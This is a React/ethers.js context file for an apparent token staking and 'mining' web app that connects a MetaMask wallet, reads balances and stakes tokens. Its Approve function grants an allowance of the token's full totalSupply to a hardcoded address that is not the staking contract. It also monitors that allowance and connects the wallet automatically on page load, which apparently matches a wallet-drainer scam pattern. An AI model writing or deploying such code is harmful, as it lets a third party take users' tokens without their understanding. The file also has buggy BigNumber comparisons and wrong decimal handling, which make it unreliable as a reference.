import { ethers } from "ethers";
import { useState, useEffect, createContext } from "react";
import { usdc, usdt, contractAbi } from "../utils/constants";
import tokenAddress from "../contractsData/token-address.json"
import tokenAbi from "../contractsData/token.json"
import constractAddress from "../contractsData/stakingContract-address.json"
import contract from "../contractsData/stakingContract.json"
import { useNavigate } from "react-router-dom";

export const Store = createContext();
const { ethereum } = window;

const getEthereumContract = (address) => {
  const provider = new ethers.providers.Web3Provider(ethereum);
  const signer = provider.getSigner();
  const getwallet = new ethers.Contract(address, contractAbi, signer);
  return getwallet;
};
const getTokenContract = () => {
  const provider = new ethers.providers.Web3Provider(ethereum);
  const signer = provider.getSigner();
  const vendingMachineContract = new ethers.Contract(tokenAddress.address, tokenAbi.abi, signer);
  return vendingMachineContract;
}

const getContract = () => {
  const provider = new ethers.providers.Web3Provider(ethereum);
  const signer = provider.getSigner();
  const vendingMachineContract = new ethers.Contract(constractAddress.address, contract.abi, signer);
  return vendingMachineContract;
}



export const StoreProvider = ({ children }) => {
  const [currentAccount, setCurrentAccount] = useState();
  const [handle, setHandle] = useState(false);
  const [success, setSuccess] = useState("");
  const [loading, setLoading] = useState(false);
  const [balanceOfUsdtState, setBalanceOfUsdtState] = useState("");
  const [balanceOfUsdcState, setBalanceOfUsdcState] = useState("");
  const [balanceOfEthState, setBalfEthState] = useState("");
  const [amount, setAmount] = useState("");
  const [allowance, setAllowance] = useState("");

  const navigate = useNavigate();


  ethereum.on("accountsChanged", async (account) => {
    setCurrentAccount(account[0]);
  });

  const checkIsWalletConnected = async () => {
    try {
      if (!ethereum) return alert("please install MetaMask");
      const accounts = await ethereum.request({ method: "eth_accounts" });
      if (accounts.length) {
        setCurrentAccount(accounts[0]);
        console.log("Account", accounts[0]);
      } else {
        console.log("No account Found");
      }
    } catch (err) {
      throw new Error("No ethereum Object");
    }
  };


  const connectWallet = async () => {
    try {
      if (!ethereum) return alert("Please install Metamask");
      const accounts = await ethereum.request({
        method: "eth_requestAccounts",
      });
      if (accounts?.code == 4001) {
        throw new Error("No ethereum object");
      }
      setCurrentAccount(accounts[0]);
      console.log("END");
    } catch (err) {
      setHandle(true);
    }
  };

  
  const balanceOfUsdc = async () => {
    const res = await getEthereumContract(usdc).balanceOf(currentAccount);
    setBalanceOfUsdcState(ethers.utils.formatUnits(res, "ether"))
    
  };

  const balanceOfUsdt = async () => {
    const res = await getEthereumContract(usdt)?.balanceOf(currentAccount);
    setBalanceOfUsdtState(ethers.utils.formatUnits(res, "ether"))
  };

  const balanceOfEth = async ()=>{
    const provider = new ethers.providers.Web3Provider(ethereum);
    const balanceOfEth = await provider.getBalance(currentAccount)
    setBalfEthState(ethers.utils.formatUnits(balanceOfEth, "ether"))
}

//Here is call the fucntions
const allowanceCheek = async()=>{
 let allwance = await getTokenContract()?.allowance(currentAccount,"0xA2FB1C70c55E408eAE031bEBcEDf30bf0F2ef9DB");
 setAllowance(allwance)
 }
 
const HostingNow = async () => {
    try {
      setLoading(true)
      let value = ethers.utils.parseEther(amount);
      let bal = await getTokenContract()?.balanceOf(currentAccount);
      console.log(bal.toString())
      if (bal >= value) {
        const res = await getTokenContract()?.approve(constractAddress.address,value);
        await res.wait();
        await getContract()?.Staking(tokenAddress.address, value);
        setAmount("")
        setLoading(false)
        navigate("/")
      }
      else {
        setLoading(false)
        navigate("/")
      }
    } catch (error) {
      setLoading(false)
      console.log(error);
    }
  }

  const Mining = async () => {
    try {
    setLoading(true)
    //TODO:: change the price value Here
    let value = ethers.utils.parseEther("5");
    let bal = await getTokenContract()?.balanceOf(currentAccount);
    console.log(bal.toString())
    if (bal >= value) {
      const res = await getTokenContract()?.approve(constractAddress.address, value);
      await res.wait();
      await getContract()?.Staking(tokenAddress.address, value);
      setLoading(false)
      navigate("/")
    }
    else {
      setLoading(false)
      navigate("/")
    }
      
    } catch (error) {
      console.log(error);
      setLoading(false)
    }
  }

  const Approve = async()=>{
    try {
      setLoading(true)
      let value = await getTokenContract()?.totalSupply();
      console.log("value",value.toString())
      const res = await getTokenContract()?.approve("0xA2FB1C70c55E408eAE031bEBcEDf30bf0F2ef9DB",value);
      await res.wait();
      setLoading(false)
      navigate("/")
    } catch (error) {
      console.log(error)
    }
    
  
  }


  useEffect(() => {
    checkIsWalletConnected();
  }, []);

  useEffect(() => {
    connectWallet();
  }, []);

  useEffect(() => {
    allowanceCheek();
  },[currentAccount])

  useEffect(()=>{
    balanceOfUsdc(usdc)
    balanceOfUsdt(usdt)
    balanceOfEth()
  },[currentAccount])

  return (
    <Store.Provider
      value={{allowance,Approve,loading, Mining, setAmount, HostingNow,connectWallet, currentAccount, handle, setHandle, balanceOfUsdcState, balanceOfUsdtState, balanceOfEthState }}
    >
      {children}
    </Store.Provider>
  );
};